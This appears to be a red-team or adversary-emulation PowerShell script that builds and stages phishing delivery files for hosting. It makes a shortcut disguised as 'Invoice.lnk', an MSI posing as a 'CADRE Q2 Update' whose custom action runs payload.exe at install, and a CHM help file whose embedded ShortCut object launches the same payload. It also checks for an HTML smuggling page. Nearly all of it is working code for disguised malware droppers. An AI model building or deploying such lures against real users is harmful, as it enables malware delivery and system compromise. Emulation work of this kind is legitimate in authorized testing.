# Build + KEEP all Campaign H artifacts for hosting on provisioning:8081
$ErrorActionPreference = 'Continue'
$www = 'C:\Tools\campaign-h\www'

# ---------- H-01 LNK ----------
Write-Output '===== H-01 LNK BUILD ====='
$ws = New-Object -ComObject WScript.Shell
$lnk = $ws.CreateShortcut("$www\Invoice.lnk")
$lnk.TargetPath = 'C:\Windows\System32\cmd.exe'
$lnk.Arguments = '/c C:\Windows\Temp\payload.exe'
$lnk.IconLocation = 'C:\Windows\System32\shell32.dll,3'
$lnk.Save()
Write-Output "LNK_BUILT $((Get-Item "$www\Invoice.lnk").Length)"

# ---------- H-02 MSI (keep) ----------
Write-Output '===== H-02 MSI BUILD ====='
if (Test-Path "$www\wix\candle.exe") {
    $wxs = @'
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="CADRE Q2 Update" Language="1033" Version="1.0.0" Manufacturer="CADRE Lab" UpgradeCode="11111111-2222-3333-4444-555555555555">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perUser"/>
    <MajorUpgrade DowngradeErrorMessage="A newer version of [ProductName] is already installed."/>
    <Media Id="1" Cabinet="media1.cab" EmbedCab="yes"/>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="CADREH02"/>
      </Directory>
    </Directory>
    <Component Id="PayloadComponent" Guid="*" Directory="INSTALLFOLDER">
      <File Id="PayloadFile" Source="payload.exe" KeyPath="yes"/>
    </Component>
    <Feature Id="MainFeature" Title="Main" Level="1">
      <ComponentRef Id="PayloadComponent"/>
    </Feature>
    <CustomAction Id="RunPayload" FileKey="PayloadFile" ExeCommand="" Execute="deferred" Impersonate="no" Return="ignore"/>
    <InstallExecuteSequence>
      <Custom Action="RunPayload" After="InstallFiles"/>
    </InstallExecuteSequence>
  </Product>
</Wix>
'@
    Set-Content -Path "$www\H-02-evil.wxs" -Value $wxs -Encoding UTF8
    Push-Location $www
    & "$www\wix\candle.exe" H-02-evil.wxs -o H-02-evil.wixobj 2>&1 | Out-Null
    & "$www\wix\light.exe" H-02-evil.wixobj -out H-02-evil.msi 2>&1 | Out-Null
    Pop-Location
    Write-Output "MSI_BUILT $(Test-Path "$www\H-02-evil.msi")"
    if (Test-Path "$www\H-02-evil.msi") { Write-Output "MSI_SIZE $((Get-Item "$www\H-02-evil.msi").Length)" }
}

# ---------- H-03 CHM (keep) ----------
Write-Output '===== H-03 CHM BUILD ====='
if (Test-Path "$www\hhw\hhc.exe") {
    $htm = @'
<html><head><title>CADRE Help Center</title></head>
<body><h1>Update guide</h1>
<OBJECT id=sc type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap:shortcut">
<PARAM name="Item1" value=",C:\Windows\System32\cmd.exe,/c C:\Windows\Temp\payload.exe">
</OBJECT>
</body></html>
'@
    Set-Content -Path "$www\H-03-evil.htm" -Value $htm -Encoding ASCII
    Set-Content -Path "$www\H-03-evil.hhc" -Value '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN"><HTML><HEAD></HEAD><BODY><UL><LI><OBJECT type="text/sitemap"><param name="Name" value="Welcome"></OBJECT></LI></UL></BODY></HTML>' -Encoding ASCII
    Set-Content -Path "$www\H-03-evil.hhp" -Value "[OPTIONS]`nCompatibility=1.1 or later`nCompiled file=H-03-evil.chm`nContents file=H-03-evil.hhc`nDefault topic=H-03-evil.htm`nTitle=CADRE Help Center`n`n[FILES]`nH-03-evil.htm" -Encoding ASCII
    Push-Location $www
    & "$www\hhw\hhc.exe" "H-03-evil.hhp" 2>&1 | Out-Null
    Pop-Location
    Write-Output "CHM_BUILT $(Test-Path "$www\H-03-evil.chm")"
    if (Test-Path "$www\H-03-evil.chm") { Write-Output "CHM_SIZE $((Get-Item "$www\H-03-evil.chm").Length)" }
}

# ---------- H-04 html (ensure present) ----------
Write-Output "H04_HTML $(Test-Path "$www\H-04-smuggle.html")"

Write-Output '===== FINAL ARTIFACT LIST ====='
Get-ChildItem $www -File | Where-Object { $_.Name -match '^(Invoice|H-02|H-03|H-04|payload|AutoIt3)' } | Select-Object Name, Length | Format-Table -AutoSize | Out-String -Width 120 | Write-Output
Write-Output 'H_ARTIFACTS_DONE'
